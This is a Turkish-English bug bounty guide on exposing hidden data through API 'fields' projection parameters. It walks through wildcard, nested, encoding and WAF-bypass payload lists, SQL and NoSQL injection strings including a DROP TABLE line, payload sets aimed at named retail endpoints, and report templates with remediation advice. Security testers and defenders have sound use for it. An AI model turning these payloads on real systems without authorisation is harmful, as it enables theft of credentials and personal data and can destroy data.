# Field Selection / Projection Parameter - Bugbounty Guide

## 📋 Table of Contents
1. [Temel Kavramlar](#temel-kavramlar)
2. [Nasıl Çalışır](#nasıl-çalışır)
3. [Zafiyet Türleri](#zafiyet-türleri)
4. [Temel Testler](#temel-testler)
5. [Advanced Teknikler](#advanced-teknikler)
6. [Payload Koleksiyonu](#payload-koleksiyonu)
7. [Real-World Örnekler](#real-world-örnekler)
8. [Bypass Teknikleri](#bypass-teknikleri)
9. [Impact & CVSS](#impact--cvss)
10. [Report Şablonu](#report-şablonu)

---

## Temel Kavramlar

### Ne Demek?

```
?fields=DEFAULT,subscriptions(totalPriceAmount,priceDiscountApplied)
?fields=FULL
?fields=password,email,admin
```

Backend'e hangi alanları (fields) döneceğini söylüyorsun.

### Neden Var?

- **Bant genişliğini kurtarma** → Sadece gerekli veriler dönesin
- **API optimization** → Client istediği veriyi seçer
- **Bookmarkable URLs** → Query state'i kaydet
- **Flexible API** → Bir endpoint, N farklı response

### Riskli Neden?

```
Backend kodda güvensiz parsing:

const fields = req.query.fields.split(',');
fields.forEach(field => {
  response[field] = user[field];  // ⚠️ Validation eksik!
});

return response;
```

Validation yapmazsa **gizli alanları ifşa eder**.

---

## Nasıl Çalışır

### Frontend Seviye

```javascript
// User interface
Filter: "Show Price Details"
Filter: "Show Discount"

// Frontend bunu parametreye dönüştürüyor
const fields = ['DEFAULT', 'subscriptions', 'price'];
const url = `/api/cart?fields=${fields.join(',')}`;

fetch(url)
  .then(res => res.json())
  .then(data => displayData(data));
```

### Backend Seviye

```python
# Python/Flask örneği
@app.route('/api/users/<user_id>/subscriptions')
def get_subscriptions(user_id):
    fields = request.args.get('fields', 'DEFAULT').split(',')
    
    user = db.query(User).get(user_id)
    
    # Sadece istenen alanları döneceğiz (ideal)
    ALLOWED_FIELDS = {
        'DEFAULT': ['id', 'email', 'name'],
        'FULL': ['id', 'email', 'name', 'phone', 'address'],
        'ADMIN': ['id', 'email', 'password', 'api_key', 'role']  # Gizli!
    }
    
    # ❌ Zafiyet: ALLOWED_FIELDS check yapmazsa
    response = {}
    for field in fields:
        if hasattr(user, field):
            response[field] = getattr(user, field)
    
    return response  # password, api_key da dönebilir!
```

### GraphQL Benzerliği

```graphql
# GraphQL aynı işi yapıyor
{
  user(id: 123) {
    id
    email
    password  # ❌ Request edebilirim
    admin     # ❌ Private field
  }
}
```

REST API'de de `fields` aynı şeyi yapıyor.

---

## Zafiyet Türleri

### 1. Information Disclosure (Over-Exposure) ⚠️⚠️⚠️

**En sık zafiyet.**


bu istekler idor verebilir
```
?fields=owner.uri,owner.name,team_data.team_name,team_membership.permission_level,team_data.logo_uri,team_data.pctures.uri,untranslated_user_role.user_role
```


```
Gizli alanları request edebilirim

?fields=DEFAULT,password
?fields=FULL,api_key
?fields=*,credit_card
?fields=admin,secret_token
?fields=all
?fields=DEFAULT,user(password)
```

**Backend Response:**
```json
{
  "id": 123,
  "email": "user@example.com",
  "password": "sha256_hash_...",  // ⚠️ Exposed!
  "api_key": "sk_live_...",       // ⚠️ Exposed!
  "credit_card": "4111-****-****" // ⚠️ Exposed!
}
```

### 2. Nested Field Injection

```
İç nesnelerin gizli alanlarını almak

?fields=subscriptions(password)
?fields=subscriptions(admin)
?fields=user(credit_card)
?fields=orders(payment_info)
?fields=carts(admin_notes)
```

**Backend Response:**
```json
{
  "subscriptions": [
    {
      "id": 1,
      "password": "user_password"  // ⚠️ İç objedeki gizli alan!
    }
  ]
}
```

### 3. Wildcard/Glob Patterns

```
Tüm alanları bir kere açığa çıkarmak

?fields=*
?fields=**
?fields=*.password
?fields=user.*
?fields=**.*
?fields=..password  (directory traversal tarzı)
```

### 4. Type Confusion

```
Parsing hatası yaratmak

?fields=true
?fields=false
?fields=1
?fields=admin  (string yerine boolean)
?fields=["password"]  (array injection)
?fields={password}    (object injection)
```

Backend type checking yapmazsa unexpected behavior.

### 5. Case Sensitivity Bypass

```
?fields=PASSWORD
?fields=Password
?fields=PaSsWoRd
?fields=ADMIN
?fields=Admin
?fields=aDmIn
```

### 6. Enumeration

```
Hangi alanlar var öğrenmek

?fields=admin
?fields=is_admin
?fields=admin_panel
?fields=superuser
?fields=is_verified
?fields=internal_data
?fields=debug
?fields=secret
?fields=token
```

**Başarılıysa = field var ve ifşa edilebilir**

### 7. Array Index Injection

```
?fields=subscriptions[0](password)
?fields=subscriptions[*](admin)
?fields=orders[].payment_info
?fields=carts[0,1,2](secret)
```

### 8. Operator Injection

```
?fields=password:decrypt
?fields=email:hash
?fields=admin:true
?fields=credit_card:display
```

Backend özel operatör işleme yapıyorsa alarm.

---

## Temel Testler

### Test 1: FULL vs DEFAULT

```
Step 1: Normal request ile kaç field geliyor?
GET /api/users/john?fields=DEFAULT
Response fields count: 5

Step 2: FULL deneyebilirim?
GET /api/users/john?fields=FULL
Response fields count: 15  → ⚠️ Daha fazla!

Farklıysa = Over-exposure
```

### Test 2: Gizli Alan Tahmini

```
GET /api/users/john?fields=DEFAULT,password
GET /api/users/john?fields=DEFAULT,ssn
GET /api/users/john?fields=DEFAULT,credit_card
GET /api/users/john?fields=DEFAULT,api_key
GET /api/users/john?fields=DEFAULT,admin
GET /api/users/john?fields=DEFAULT,secret_token
GET /api/users/john?fields=DEFAULT,hash
GET /api/users/john?fields=DEFAULT,salt

Hangisinde 200 OK döner = zafiyet buldum!
```

### Test 3: Wildcard Test

```
GET /api/users/john?fields=*
GET /api/users/john?fields=**
GET /api/users/john?fields=all
GET /api/users/john?fields=.
GET /api/users/john?fields=*.*
```

### Test 4: Nested Test

```
GET /api/users/john/subscriptions?fields=DEFAULT,subscriptions(password)
GET /api/users/john/subscriptions?fields=subscriptions(*)
GET /api/users/john/subscriptions?fields=subscriptions(admin,secret)
```

### Test 5: Multiple Fields

```
GET /api/carts/123?fields=DEFAULT,items,admin,payment_method
GET /api/orders/456?fields=order_id,customer(password),total,admin_notes
```

### Test 6: Array/List Exploitation

```
GET /api/users?fields=DEFAULT,password
GET /api/users?fields=[password, email, admin]
GET /api/users?fields={password, email}
```

---

## Advanced Teknikler

### Teknik 1: Recursive Field Expansion

```
Field path'ı derinlemesine açmak

?fields=user(profile(settings(admin)))
?fields=orders(items(product(category(admin_only))))
?fields=cart(checkout(payment(token)))
```

Her level'de gizli field var mı test et.

### Teknik 2: Filter Bypass via Fields

```
Normalde filterlenen veriyi fields ile almak

GET /api/admin/users  → 403 Forbidden

GET /api/users/me?fields=admin_users
GET /api/users/me?fields=deleted_users
GET /api/users/me?fields=banned_users
```

### Teknik 3: Projection Manipulation

```
Backend cache yapıyorsa

GET /api/users/123?fields=DEFAULT
→ Cached: {id, email, name}

GET /api/users/123?fields=password
→ Cache hit! Password alsam?

Some backends cache query result, fields sonra 
uygulanıyor = injection olabilir
```

### Teknik 4: Method Injection in Fields

```
Bazı API'ler özel metod çağırabilir

?fields=email:lower
?fields=phone:format
?fields=password:verify

?fields=user.getPassword()
?fields=user.admin()
?fields=admin.dump()
```

### Teknik 5: SQL Injection Through Fields

```
Backend field validation yapmazsa SQL injection

?fields=DEFAULT,password' OR '1'='1
?fields=DEFAULT,* FROM users--
?fields=DEFAULT,id;DROP TABLE users--

Risky ama SAP Commerce gibi eski sistemlerde olabilir
```

### Teknik 6: NoSQL Injection (JSON API)

```
?fields={"$ne": null}
?fields={"$where": "this.admin = true"}
?fields={"_id": {"$regex": ".*"}}

MongoDB backend'lerde çalışabilir
```

### Teknik 7: Content-Type Bypass

```
GET /api/users/john?fields=DEFAULT,password
Content-Type: application/json

POST /api/users/john
Content-Type: application/json
{"fields": "DEFAULT,password"}

POST /api/users/john
Content-Type: application/xml
<fields>DEFAULT,password</fields>
```

### Teknik 8: Encoding Bypass

```
?fields=DEFAULT,password
Blocked?

?fields=DEFAULT,p@ssword          (@ → s)
?fields=DEFAULT,passw0rd          (0 → o)
?fields=DEFAULT,p4ssw0rd
?fields=DEFAULT,%70assword        (hex: %70 = p)
?fields=DEFAULT,&#112;assword    (HTML: &#112; = p)
?fields=DEFAULT,\x70assword       (escape)
```

### Teknik 9: Case Variation Bypass

```
?fields=DEFAULT,PASSWORD
?fields=DEFAULT,Password
?fields=DEFAULT,PaSsWoRd
?fields=DEFAULT,pAsSWoRd
?fields=DEFAULT,ADMIN
?fields=DEFAULT,AdMiN
```

### Teknik 10: Timing Attack

```
Request süresi ile field var mı anlamak

?fields=DEFAULT            → 50ms
?fields=DEFAULT,password   → 51ms (field var)
?fields=DEFAULT,nonexistent → 50ms (field yok)

Eğer password isteği yavaşsa = field var ve işleniyor
```

### Teknik 11: Error Message Analysis

```
?fields=DEFAULT,password
→ Error: "Field 'password' is not allowed"
   = Sistem biliyor bu field var!

?fields=DEFAULT,nonexistent
→ Error: "Field not found"
   = Tahmini field yok
```

### Teknik 12: Combination Attack

```
Birden fazla zafiyet kombinasyonu

?fields=DEFAULT,password&lang=de&curr=EUR
?fields=DEFAULT,admin&include=relations
?fields=FULL&expand=nested&detailed=true

Multiple parameters interaction'ı test et
```

### Teknik 13: Unicode/Special Characters

```
?fields=DEFAULT,пароль              (Cyrillic)
?fields=DEFAULT,密码                (Chinese)
?fields=DEFAULT,p\u0061ssword      (Unicode escape)
?fields=DEFAULT,pässwörd            (Special char)
```

### Teknik 14: Null Byte Injection

```
?fields=DEFAULT,password%00,email
?fields=DEFAULT,password\0,email

Eski sistemler null byte'dan sonrasını ignore edebilir
```

---

## Payload Koleksiyonu

### Essity (SAP Commerce) Payloads

```
Endpoint: /occ/v2/tena-de-spa/users/{userId}/subscriptionsEntries

# Temel
?fields=FULL
?fields=DEFAULT,*
?fields=all

# Gizli alanlar
?fields=DEFAULT,password
?fields=DEFAULT,api_key
?fields=DEFAULT,admin
?fields=DEFAULT,internal_id
?fields=DEFAULT,isAdmin

# Nested
?fields=DEFAULT,subscriptions(password)
?fields=DEFAULT,subscriptions(*)
?fields=DEFAULT,user(admin)

# Advanced
?fields=DEFAULT,subscriptions(priceDiscountApplied,password,admin)
?fields=DEFAULT,cartModifications(*.password)
?fields=subscriptions(basePrice(value,admin))
```

### ThePerfumeShop (Ecommerce) Payloads

```
Endpoint: /users/{userId}/carts/{cartId}/stores

# Temel
?fields=FULL
?fields=*
?fields=DEFAULT,all

# Gizli alanlar
?fields=DEFAULT,admin
?fields=DEFAULT,internal_notes
?fields=DEFAULT,password
?fields=DEFAULT,cost
?fields=DEFAULT,margin

# Nested
?fields=stores(admin)
?fields=stores(*.password)
?fields=stores(internal_data)

# Advanced
?fields=FULL,admin_config,system_info
?fields=stores(address,admin_panel,secret_code)
```

### Generic E-commerce Payloads

```
# Product endpoint
?fields=DEFAULT,cost
?fields=DEFAULT,margin
?fields=DEFAULT,supplier_price
?fields=DEFAULT,admin_notes
?fields=DEFAULT,internal_code

# User endpoint
?fields=DEFAULT,password
?fields=DEFAULT,ssn
?fields=DEFAULT,credit_card
?fields=DEFAULT,date_of_birth
?fields=DEFAULT,phone
?fields=DEFAULT,address
?fields=DEFAULT,admin

# Order endpoint
?fields=DEFAULT,payment_method
?fields=DEFAULT,payment_token
?fields=DEFAULT,admin_notes
?fields=DEFAULT,cost_breakdown
?fields=DEFAULT,supplier_details

# Cart endpoint
?fields=DEFAULT,coupon_code
?fields=DEFAULT,admin_discount
?fields=DEFAULT,internal_pricing
?fields=DEFAULT,cost_details
```

### Generic API Payloads

```
# Wildcard variations
?fields=*
?fields=**
?fields=all
?fields=.
?fields=*.*
?fields=..

# Common sensitive fields
?fields=password
?fields=api_key
?fields=token
?fields=secret
?fields=admin
?fields=ssn
?fields=credit_card
?fields=internal
?fields=debug
?fields=system

# Multiple
?fields=password,admin,token,api_key,secret
?fields=DEFAULT,password,admin,internal,debug

# Nested variants
?fields=user(password)
?fields=profile(admin)
?fields=settings(secret)
?fields=*(password)

# Array notation
?fields=items[].password
?fields=items[*].admin
?fields=items[0](secret)
```

### Bypass Payloads

```
# Case variation
?fields=PASSWORD
?fields=Admin
?fields=API_KEY

# Encoding
?fields=%70assword        (hex)
?fields=&#112;assword     (HTML)
?fields=p\u0061ssword     (Unicode)

# Null byte
?fields=password%00,admin

# Special chars
?fields=pass|word
?fields=pass&word
?fields=pass:decrypt

# Comment bypass
?fields=password/**/,admin
?fields=password//admin
```

---

## Real-World Örnekler

### Örnek 1: Essity Subscription Data Leak

```
Original Request:
GET /occ/v2/tena-de-spa/users/suslu7616@wearehackerone.com/subscriptionsEntries
?fields=DEFAULT,subscriptions(totalPriceAmount(formattedValue),priceDiscountApplied)
&lang=de&curr=EUR

Malicious Request:
GET /occ/v2/tena-de-spa/users/suslu7616@wearehackerone.com/subscriptionsEntries
?fields=DEFAULT,subscriptions(totalPriceAmount,priceDiscountApplied,password,admin,internal_id)
&lang=de&curr=EUR

Response:
{
  "subscriptions": [
    {
      "totalPriceAmount": {...},
      "priceDiscountApplied": {...},
      "password": "user_password_hash",  // ⚠️ LEAKED
      "admin": false,
      "internal_id": "INT-12345"         // ⚠️ LEAKED
    }
  ]
}
```

### Örnek 2: ThePerfumeShop Store Admin Data Leak

```
Original Request:
GET /users/123/carts/456/stores
?fields=FULL

Malicious Request:
GET /users/123/carts/456/stores
?fields=FULL,admin_password,admin_panel,system_config

Response:
{
  "stores": [
    {
      "id": 1,
      "name": "Berlin Store",
      "address": "...",
      "admin_password": "admin_pass_123",     // ⚠️ LEAKED
      "admin_panel": "https://admin.shop.de", // ⚠️ LEAKED
      "system_config": {
        "db_password": "db_pass_456",         // ⚠️ LEAKED
        "api_key": "sk_live_..."              // ⚠️ LEAKED
      }
    }
  ]
}
```

### Örnek 3: Nested Injection with User Enumeration

```
Endpoint: /api/teams/{teamId}/members

Original:
GET /api/teams/team123/members
?fields=DEFAULT

Malicious:
GET /api/teams/team123/members
?fields=DEFAULT,user(password,ssn,is_admin)

Response:
{
  "members": [
    {
      "id": "user1",
      "email": "user1@company.com",
      "user": {
        "password": "hashed_pass",     // ⚠️ LEAKED
        "ssn": "123-45-6789",          // ⚠️ LEAKED
        "is_admin": true               // ⚠️ Admin buldum
      }
    }
  ]
}
```

---

## Bypass Teknikleri

### WAF/Filter Bypass

#### Teknik 1: Comment Injection
```
fields=DEFAULT,pass/**/word
fields=DEFAULT,pass--word
fields=DEFAULT,pass#word
fields=DEFAULT,pass/*comment*/word
```

#### Teknik 2: Case Mutation
```
fields=DEFAULT,PASSWORD
fields=DEFAULT,PaSsWoRd
fields=DEFAULT,pAsSWoRd
fields=DEFAULT,aDmIn
```

#### Teknik 3: Encoding
```
# URL Encoding
fields=DEFAULT,%70assword     (%70 = p)
fields=DEFAULT,%61dmin         (%61 = a)

# Unicode
fields=DEFAULT,\u0070assword
fields=DEFAULT,\x70assword

# HTML Entity
fields=DEFAULT,&#112;assword

# Base64 (nadir)
fields=DEFAULT,cGFzc3dvcmQ=   (password Base64)
```

#### Teknik 4: Null Byte
```
fields=DEFAULT,password%00extra
fields=DEFAULT,password\0extra
```

#### Teknik 5: Double Encoding
```
fields=DEFAULT,%2570assword   (%25 = %, yani %70 encode)
```

#### Teknik 6: Mixed Notation
```
fields=DEFAULT,pass[0]word
fields=DEFAULT,pass{word}
fields=DEFAULT,pass(word)
fields=DEFAULT,pass-word
fields=DEFAULT,pass_word
```

#### Teknik 7: Parameter Pollution
```
fields=DEFAULT&fields=password
fields=admin&fields=user&fields=password
```

#### Teknik 8: HTTP Method Variation
```
GET /api/users?fields=password
POST /api/users?fields=password
PUT /api/users?fields=password
PATCH /api/users?fields=password
HEAD /api/users?fields=password
```

#### Teknik 9: Content-Type Bypass
```
# JSON
Content-Type: application/json
POST /api/users
{"fields": "DEFAULT,password"}

# XML
Content-Type: application/xml
POST /api/users
<fields>DEFAULT,password</fields>

# Form Data
Content-Type: application/x-www-form-urlencoded
fields=DEFAULT,password
```

#### Teknik 10: Header Bypass
```
X-Fields: password,admin
X-Requested-Fields: password
Authorization-Fields: password
```

---

## Impact & CVSS

### Severity Levels

| Field Type | Example | CVSS | P Level | Impact |
|-----------|---------|------|---------|--------|
| **Password Hash** | password | 7.5-8.0 | P1 | Credential leak |
| **Plaintext Password** | password (plaintext) | 8.5-9.0 | P1 | Account takeover |
| **API Key/Token** | api_key, auth_token | 7.5-8.5 | P1 | Service abuse |
| **Credit Card** | credit_card, payment_info | 8.0-9.0 | P1 | Financial fraud |
| **SSN/ID** | ssn, national_id | 7.0-8.0 | P1 | Identity theft |
| **Personal Info** | phone, address, dob | 6.5-7.0 | P2 | Privacy violation |
| **Admin Flag** | is_admin, admin, role | 6.0-7.0 | P2 | Privilege escalation |
| **Internal Data** | internal_id, debug | 5.0-6.5 | P2 | System discovery |
| **Cost Data** | cost, margin, supplier_price | 5.0-6.0 | P2/P3 | Business logic |
| **Metadata** | version, timestamp | 3.0-4.0 | P3 | Info disclosure |

### CVSS Calculation

```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

AV:N     = Network (uzaktan erişim)
AC:L     = Low (kolay exploit)
PR:N     = No privileges needed
UI:N     = User interaction yok
S:U      = Scope unchanged
C:H      = Confidentiality high (gizli veri sızıyor)
I:N      = Integrity not affected
A:N      = Availability not affected

= 7.5 (High)
```

### Report Priority

```
P1 (Critical):
- Password leak (plaintext or crackable)
- API key / Auth token
- Credit card / Payment info
- SSN / Passport
- Credentials
- Admin credentials

P2 (High):
- Admin flag disclosure
- Internal system info
- Cost/margin data
- Private API endpoints
- User enumeration

P3 (Medium):
- Version info
- Metadata
- Timestamps
- Non-sensitive business logic
```

---

## Report Şablonu

### Minimum Report

```markdown
# Information Disclosure via Field Selection Parameter

## Vulnerability Details

**Type:** Information Disclosure / Over-Exposure
**Severity:** High (CVSS 7.5)
**Priority:** P1

## Affected Endpoint

```
GET /api/users/{userId}/subscriptions
GET /users/{userId}/carts/{cartId}/stores
```

## Parameter

```
?fields=DEFAULT,password
?fields=FULL
?fields=*
```

## Description

The API allows users to specify which fields to return via 
the `fields` query parameter. However, the backend does not 
properly validate which fields are sensitive and exposes 
confidential data when explicitly requested.

## Proof of Concept

### Step 1: Normal Request
```
GET /api/users/john/subscriptions?fields=DEFAULT
Host: example.com

Response:
{
  "id": 123,
  "email": "john@example.com",
  "name": "John Doe"
}
```

### Step 2: Malicious Request
```
GET /api/users/john/subscriptions?fields=DEFAULT,password
Host: example.com

Response:
{
  "id": 123,
  "email": "john@example.com",
  "name": "John Doe",
  "password": "$2a$10$hashedpassword",  // ⚠️ EXPOSED
}
```

## Impact

- User credentials exposed
- Account takeover possible
- Privilege escalation
- Lateral movement

## Reproduction Steps

1. Authenticate as any user
2. Request own subscription data with ?fields=DEFAULT
3. Request same endpoint with ?fields=DEFAULT,password
4. Compare responses - password field is returned

## Remediation

1. Implement field whitelist validation:
```python
ALLOWED_FIELDS = {
    'DEFAULT': ['id', 'email', 'name'],
    'FULL': ['id', 'email', 'name', 'phone']
}
```

2. Never expose sensitive fields via fields parameter:
```python
BLACKLIST_FIELDS = ['password', 'api_key', 'token', 'admin']
if any(field in BLACKLIST_FIELDS for field in requested_fields):
    return 403 Forbidden
```

3. Server-side validation only (client-side can be bypassed)

## Timeline

- **Found:** 2026-09-03
- **Reported:** 2026-09-03
- **Expected Response:** 14 days
```

### Detailed Report with Multiple Findings

```markdown
# Multiple Information Disclosure Vulnerabilities via Field Selection

## Executive Summary

Multiple endpoints allow unauthenticated or low-privilege users 
to request sensitive fields that should not be exposed, resulting 
in information disclosure of passwords, API keys, and admin credentials.

## Vulnerabilities

### 1. User Subscription Data Leak (Critical)

**Endpoint:** `GET /occ/v2/tena-de-spa/users/{userId}/subscriptionsEntries`
**Parameter:** `fields`
**Severity:** P1 (CVSS 8.0)

**Proof:**
```
GET /occ/v2/tena-de-spa/users/test@example.com/subscriptionsEntries
?fields=DEFAULT,subscriptions(password,admin,api_key)
&lang=de&curr=EUR

Response:
{
  "subscriptions": [
    {
      "id": 1,
      "totalPrice": "19.99",
      "password": "user_password",    // ⚠️
      "admin": true,                  // ⚠️
      "api_key": "sk_live_..."        // ⚠️
    }
  ]
}
```

### 2. Store Admin Data Leak (Critical)

**Endpoint:** `GET /users/{userId}/carts/{cartId}/stores`
**Parameter:** `fields`
**Severity:** P1 (CVSS 8.5)

**Proof:**
```
GET /users/123/carts/456/stores
?fields=FULL,admin_password,system_config

Response:
{
  "stores": [
    {
      "id": 1,
      "name": "Berlin",
      "admin_password": "admin123",           // ⚠️
      "system_config": {
        "db_password": "db_pass",             // ⚠️
        "api_endpoint": "https://internal..", // ⚠️
      }
    }
  ]
}
```

### 3. Nested Field Injection (High)

**Pattern:** `?fields=entity(sensitive_field)`

Multiple endpoints vulnerable to nested field injection allowing 
access to sensitive nested object properties.

## Affected Endpoints

| Endpoint | Vulnerable Field | Exposed Data |
|----------|------------------|--------------|
| /users/{id}/subscriptions | password, admin | Credentials |
| /carts/{id}/stores | admin_password, config | Admin access |
| /orders/{id} | payment_token | Payment data |
| /products | cost, margin | Business data |

## Remediation

1. Implement strict whitelist for allowed fields
2. Never include sensitive fields in response
3. Validate on backend only
4. Return 403 Forbidden for unauthorized fields
5. Use GraphQL directive or similar for field-level access control

## Tools Used

- Burp Suite (manual testing)
- Custom Python script for payload enumeration
- curl for verification

---
```

---

## Testing Workflow

```
1. KEŞIF (Discovery) - 5 dakika
   - ?fields=DEFAULT vs ?fields=FULL
   - Kaç field fark var?
   - Response structure inceleme

2. TAHMIN (Guessing) - 10 dakika
   - password, admin, api_key dene
   - Başarılıysa = zafiyet
   - Kaç field açığa çıkıyor?

3. ADVANCED (Advanced) - 15 dakika
   - Wildcard patterns (* , **, all)
   - Nested injection (entity(field))
   - Case variation bypass
   - Encoding bypass

4. BYPASS (WAF Bypass) - 10 dakika
   - Comment injection /* */
   - Hex encoding %70
   - Null byte %00
   - Double encoding %25

5. REPORT (Reporting) - 10 dakika
   - Type: Information Disclosure
   - Severity: High (7.5+)
   - Impact clear statement
   - Remediation suggestion

Total: 50 dakika / 1 zafiyet
```

---

## Checklists

### Pre-Testing
- [ ] Target API'nin dökümentasyonu inceledim
- [ ] Normal request'i test ettim
- [ ] Response structure'ını anladım
- [ ] Kaç field standart dönüyor?

### Testing
- [ ] FULL denedim
- [ ] * denedim
- [ ] password denedim
- [ ] admin denedim
- [ ] api_key denedim
- [ ] Nested injection denedim (entity(field))
- [ ] Case variation denedim
- [ ] Encoding bypass denedim
- [ ] Wildcard patterns denedim

### Verification
- [ ] Exploit tekrarlanabiliyor
- [ ] Başka user'lar için de çalışıyor
- [ ] Nested fields'ı tam mapped ettim
- [ ] Impact clear

### Reporting
- [ ] Proof of Concept clear
- [ ] Screenshots/curl commands ekledim
- [ ] CVSS calculated
- [ ] Remediation suggested
- [ ] Timeline clear

---

## Common Mistakes (Yapma!)

❌ **Yapma:** Sadece FULL dene, başka variant yok

✅ **Yap:** * , all, password, admin, api_key, nested, case variation hepsini dene

---

❌ **Yapma:** Blind test (assumption)

✅ **Yap:** Responsı al ve karşılaştır

---

❌ **Yapma:** Tek endpoint test et

✅ **Yap:** Tüm API endpoints'i scan et (/users, /orders, /carts, /products vb.)

---

❌ **Yapma:** WAF varsa pes et

✅ **Yap:** Bypass teknikleri dene (encoding, comments, case variation)

---

❌ **Yapma:** "Admin false dönüyor, zafiyet yok" diye düşün

✅ **Yap:** Admin true dönüyor mu diye test et, field accessible mı önemli

---

## Kaynaklar & Referanslar

- OWASP Excessive Data Exposure
- GraphQL Over-Exposure Patterns
- CWE-200: Exposure of Sensitive Information
- API Security Top 10 (Projection Query)

---

## Son Notlar

1. **Bu pattern çok yaygın** → E-commerce, SaaS, fintech hepsinde var
2. **Uzun sürmez** → 30-50 dakika / zafiyet
3. **P1-P2 almak kolay** → Sensitive field açığa çıkarsa P1
4. **Multiple endpoints** → Bir payload bulduğunda diğer endpoints'i de test et
5. **Nested injection'a dikkat** → Derinlemesine test et

---

**Last Updated:** September 3, 2026
**Author:** BugBounty Testing Guide
```
